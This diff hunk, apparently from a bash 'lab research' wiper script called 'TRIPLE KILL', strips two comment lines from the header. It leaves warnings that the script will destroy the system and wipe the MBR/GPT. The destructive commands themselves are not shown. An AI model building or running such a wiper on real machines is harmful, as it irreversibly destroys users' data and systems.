@@ -1,9 +1,7 @@
 #!/bin/bash
-# ============================================================
 # TRIPLE KILL - BRUTAL VERSION (NO AUTO REBOOT)
 # FOR LAB RESEARCH ONLY!
 # SYSTEM WILL DESTROY ITSELF AND CRASH NATURALLY
-# ============================================================
 
 echo "WARNING: This script will COMPLETELY DESTROY the system!"
 echo "  - MBR/GPT will be wiped"
